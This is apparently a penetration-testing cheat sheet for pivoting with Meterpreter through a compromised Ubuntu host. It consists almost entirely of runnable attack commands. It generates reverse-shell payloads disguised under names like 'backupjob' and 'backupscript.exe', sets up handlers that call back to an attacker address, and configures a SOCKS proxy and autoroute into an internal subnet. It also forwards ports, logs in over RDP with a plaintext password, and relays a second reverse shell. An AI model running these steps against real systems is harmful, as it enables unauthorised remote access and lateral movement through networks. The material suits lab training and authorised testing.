### **METERPRETER TUNNELING & PORT FORWARDING**

We will cover the essential commands and steps for setting up Meterpreter port forwarding, This guide assumes you have a Meterpreter shell on an Ubuntu server (pivot host) and wish to perform enumeration scans through this host.


### **CREATING PAYLOAD FOR UBUNTU PIVOT HOST**

1.  Generate Payload:  
    `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080`
    
2.  Start multi/handler:
    ```
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set lhost 0.0.0.0
    msf6 exploit(multi/handler) > set lport 8080
    msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > run
    ```
    
3.  Copy and Execute Payload on Pivot Host:  
    `chmod +x backupjob $ ./backupjob`
    
4.  Verify Meterpreter Session:  
    `meterpreter > pwd`
    

### **CONFIGURING MSF SOCKS PROXY**

1.  Start SOCKS Proxy:
    
    ```
    msf6 > use auxiliary/server/socks_proxy
    msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
    msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
    msf6 auxiliary(server/socks_proxy) > set version 4a
    msf6 auxiliary(server/socks_proxy) > run
    ```
    
2.  Add Line to proxychains.conf:  
    `socks4 127.0.0.1 9050`
    
3.  Create Routes with AutoRoute:
    
    ```
    msf6 > use post/multi/manage/autoroute
    msf6 post(multi/manage/autoroute) > set SESSION 1
    msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
    msf6 post(multi/manage/autoroute) > run
    ```
    

### **TESTING PROXY & ROUTING FUNCTIONALITY**

1.  Run Nmap Scan:  
    `proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn`
    
2.  Local Port Forwarding:  
    `meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19`
    
3.  Connecting to Target:  
    `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`
    
4.  View Netstat:  
    `netstat -antp`
    

### **REVERSE PORT FORWARDING**

1.  Add Reverse Port Forward:  
    `meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18`
    
2.  Start multi/handler:
    
    ```
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LPORT 8081
    msf6 exploit(multi/handler) > set LHOST 0.0.0.0
    msf6 exploit(multi/handler) > run
    ```
    
3.  Generate Windows Payload:  
    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234`
    
4.  Establish Meterpreter Session:  
    `meterpreter > shell`